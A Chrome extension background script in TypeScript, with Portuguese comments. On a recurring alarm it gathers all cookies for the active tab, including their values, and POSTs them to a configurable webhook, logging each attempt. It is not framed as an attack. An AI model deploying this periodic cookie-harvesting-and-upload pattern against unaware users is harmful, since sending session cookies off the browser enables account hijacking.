// Helper para registrar logs
async function addLog(message: string, type: 'INFO' | 'SUCCESS' | 'ERROR') {
  const { logs = [] } = await chrome.storage.local.get('logs');
  const newLog = {
    timestamp: new Date().toISOString(),
    message,
    type,
  };
  // Mantém no máximo os últimos 100 logs
  const updatedLogs = [newLog, ...logs].slice(0, 100);
  await chrome.storage.local.set({ logs: updatedLogs });
}

// Helper para atualizar métricas
async function updateMetric(metricToUpdate: 'attempts' | 'successes' | 'errors') {
  let metrics = await chrome.storage.local.get({ attempts: 0, successes: 0, errors: 0 });
  metrics[metricToUpdate]++;
  await chrome.storage.local.set(metrics);
}

async function captureAndSendCookies() {
  await addLog('Iniciando captura...', 'INFO');
  await updateMetric('attempts');
  
  chrome.action.setBadgeText({ text: '...' });
  chrome.action.setBadgeBackgroundColor({ color: '#FFA500' });

  const { webhookUrl } = await chrome.storage.sync.get(['webhookUrl']);
  if (!webhookUrl) {
    await addLog('URL do webhook não configurada.', 'ERROR');
    await updateMetric('errors');
    chrome.action.setBadgeText({ text: 'ERR' });
    chrome.action.setBadgeBackgroundColor({ color: '#dc3545' });
    return;
  }

  const [tab] = await chrome.tabs.query({ active: true, lastFocusedWindow: true });
  if (!tab || !tab.url) {
    await addLog('Nenhuma aba ativa encontrada.', 'INFO');
    chrome.action.setBadgeText({ text: '' });
    return;
  }

  const cookies = await chrome.cookies.getAll({ url: tab.url });
  if (cookies.length === 0) {
    await addLog(`Nenhum cookie encontrado para ${tab.url}.`, 'INFO');
    await updateMetric('successes');
    chrome.action.setBadgeText({ text: 'OK' });
    chrome.action.setBadgeBackgroundColor({ color: '#28a745' });
    setTimeout(() => chrome.action.setBadgeText({ text: '' }), 3000);
    return;
  }
  
  const payload = {
    capturedAt: new Date().toISOString(),
    pageUrl: tab.url,
    cookies: cookies.map(c => ({ name: c.name, value: c.value, domain: c.domain })),
  };

  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      await addLog('Cookies enviados com sucesso!', 'SUCCESS');
      await updateMetric('successes');
      chrome.action.setBadgeText({ text: 'OK' });
      chrome.action.setBadgeBackgroundColor({ color: '#28a745' });
    } else {
      await addLog(`Falha no envio: Status ${response.status}`, 'ERROR');
      await updateMetric('errors');
      chrome.action.setBadgeText({ text: 'FAIL' });
      chrome.action.setBadgeBackgroundColor({ color: '#dc3545' });
    }
  } catch (error) {
    const errorMessage = (error instanceof Error) ? error.message : String(error);
    await addLog(`Erro de rede: ${errorMessage}`, 'ERROR');
    await updateMetric('errors');
    chrome.action.setBadgeText({ text: 'FAIL' });
    chrome.action.setBadgeBackgroundColor({ color: '#dc3545' });
  }
}

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'cookie-collector') {
    captureAndSendCookies();
  }
});

console.log('Background script carregado.');
export {};